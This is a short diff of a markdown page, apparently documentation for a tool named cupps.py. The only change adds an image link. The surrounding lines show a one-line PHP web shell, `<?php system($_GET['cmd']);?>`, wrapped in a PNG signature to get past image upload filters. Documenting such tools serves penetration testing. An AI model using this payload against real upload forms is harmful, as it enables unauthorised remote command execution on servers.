@@ -39,6 +39,8 @@ As simple as
 python cupps.py -s png
 ```
 this will create PHP payload `<?php system($_GET['cmd']);?>` with PNG signature. this is one of the commonly  known tricks to bypass most of the basic image upload scenarios.
+![](/assets/images/cpngh/cupps.png)
+
 
 All the available signatures can be seen by `-h` parameter.
 
